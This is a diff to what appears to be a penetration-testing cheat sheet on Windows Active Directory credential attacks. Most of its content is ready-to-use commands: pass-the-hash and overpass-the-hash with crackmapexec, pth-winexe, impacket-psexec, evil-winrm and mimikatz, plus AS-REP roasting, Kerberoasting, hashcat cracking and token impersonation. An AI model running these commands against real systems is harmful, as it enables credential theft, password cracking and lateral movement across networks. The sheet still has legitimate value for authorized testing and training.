@@ -31,18 +31,49 @@
 -    Spray  
      `rowbar -b rdp -s <ip>\32 -U users.txt -C pw.txt -n 1`
 
-`PASS THE PW & HASH`
+`PASS THE PW`
 
          crackmapexec <ip>/24 -u <user> -d <DOMAIN> -p <password>    
-         crackmapexec <protocol> <ip>/24 -u <user> -H <hash> --local  
+        
 
+`Pass the Hash`
+
+         -> Allows an attacker to authenticate to a remote system or service via a user's NTLM hash
+         ```
+         crackmapexec <protocol> <ip>/24 -u <user> -H <hash> --local  
+         pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:<hash_ntlm> //<IP> cmd
+         ```
+         
+         -> Remote Access - impacket-psexec  
+         ```
+         impacket-psexec '<domain>/<user>'@<IP> -hashes ':<hash>'
+         impacket-psexec '<domain>/<user>'@<IP>
+         ```
+         
+         -> Remote Access + evil-winrm  
+         ```
+         evil-winrm -i <IP> -u <user> -H <hash>
+         ```
+`Over Pass the Hash`
+
+         -> Allows an attacker to abuse an NTLM user hash to obtain a full Kerberos ticket granting ticket (TGT) or service ticket, which grants us access to another machine or service as that user
+         
+         ```
+         mimikatz.exe "sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe" "exit"
+         ```
+         
+         -> Command execution with psexec  
+         ```
+         .\PsExec.exe \\<hostname> cmd.exe
+         ```
 
 ## Ticket and Token based
-`Token Impersonation`
-
-         meterpreter load icognito  
-         list_tokens  
-         impersonate_token <token>  
+### Token Impersonation
+```
+meterpreter load icognito  
+list_tokens  
+impersonate_token <token>  
+```
 
 ### Silver Ticket - Pass the Ticket
 -> It is a persistence and elevation of privilege technique in which a TGS is forged to gain access to a service in an application.
@@ -100,14 +131,46 @@ psexec.exe \\dc1 cmd.exe
 ./mimikatz.exe "lsadump::dcsync /user:Administrator"
 ```
 
+## AS-REP Roasting Attack - not require Pre-Authentication
+-> kerbrute - Enumeration Users
+```
+kerbrute userenum -d test.local --dc <dc_ip> userlist.txt
+```
+https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt
+
+-> GetNPUsers.py - Query ASReproastable accounts from the KDC
+```
+impacket-GetNPUsers domain.local/ -dc-ip <IP> -usersfile userlist.txt
+```
+
+## Kerberoast
+-> impacket-GetUserSPNs
+```
+impacket-GetUserSPNs <domain>/<user>:<password>// -dc-ip <IP> -request
+```
+or  
+```
+impacket-GetUserSPNs -request -dc-ip <IP> -hashes <hash_machine_account>:<hash_machine_account> <domain>/<machine_name$> -outputfile hashes.kerberoast
+```
+
+```
+hashcat -a 0 -m 13100 ok.txt /usr/share/wordlists/rockyou.txt 
+```
+```
+.\PsExec.exe -u <domain>\<user> -p <password> cmd.exe
+```
+or  
+```
+runas /user:<hostname>\<user> cmd.exe
+```
+
+
 `Kerberoasting`
 
          Invoke-Kerberoast in powerview  
          Invoke-Kerberoast -OutputFormat Hashcat | Select-Object Hash | Out-File -filepath 'c:\temp\hashcapture.txt' -width 8000
          https://github.com/skelsec/kerberoast
          GetUserSPNs.py -request -dc-ip <RHOST> <domain>/<user>  
-
-
      
 
 # Tools Introduction
